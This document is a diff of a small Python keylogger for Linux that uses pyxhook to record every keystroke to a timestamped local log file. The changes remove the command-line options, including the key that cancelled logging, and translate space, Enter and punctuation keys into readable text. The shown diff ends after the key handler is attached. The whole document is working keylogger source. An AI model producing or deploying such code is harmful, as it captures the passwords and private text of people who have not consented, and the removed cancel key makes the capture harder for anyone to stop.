@@ -1,55 +1,30 @@
 #!/usr/bin/env python 
 import os
-from argparse import ArgumentParser
 from datetime import datetime
-
 import pyxhook
 
-print('started:)
 def main():
-    ts = datetime.now().strftime("%d-%m-%Y_%H:%M:%S")
-    parser = ArgumentParser(description='A simple keylogger for Linux.')
-    parser.add_argument(
-            '--log-file',
-            default=os.path.join(os.getcwd(), 'keys-' + str(ts) + '.log'),
-            help='Save the output in this file.',
-            )
-    parser.add_argument(
-            '--clean-file',
-            action='store_true',
-            default=False,
-            help='Clear the log file on startup.Default is No',
-            )
-    parser.add_argument(
-            '--cancel-key',
-            help='A single key that use as the cancel key, Default is ` (backtick)',
-            )
-
-    args = parser.parse_args()
-
-    log_file = args.log_file
-
-    if args.clean_file:
-        try:
-            os.remove(log_file)
-        except OSError:
-            # TODO: log with logging module
-            pass
-
-    cancel_key = args.cancel_key[0] if args.cancel_key else  '`'
-
+    log_file=f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'
     def OnKeyPress(event):
         with open(log_file, 'a') as f:
-
             if event.Key == 'space':
-                f.write(f' {event.Key} ')
-            elif event.Key == 'P_Enter' or 'Return' :
-                f.write(f'\n{event.Key}\n')
+                f.write(' ')
+            elif event.Key == 'P_Enter' :
+                f.write('\n')
+            elif event.Key == 'Return' :
+                f.write('\n')
+            elif event.Key == 'comma' :
+                f.write(',')
+            elif event.Key == 'semicolon' :
+                f.write(';')
+            elif event.Key == 'colon' :
+                f.write(':')
+            elif event.Key == 'exclam' :
+                f.write('!')
+            elif event.Key == 'period' :
+                f.write('.')
             else:
                 f.write(f'{event.Key}')
-
-        if event.Ascii == cancel_key:
-            new_hook.cancel()
 
     new_hook = pyxhook.HookManager()
     new_hook.KeyDown = OnKeyPress
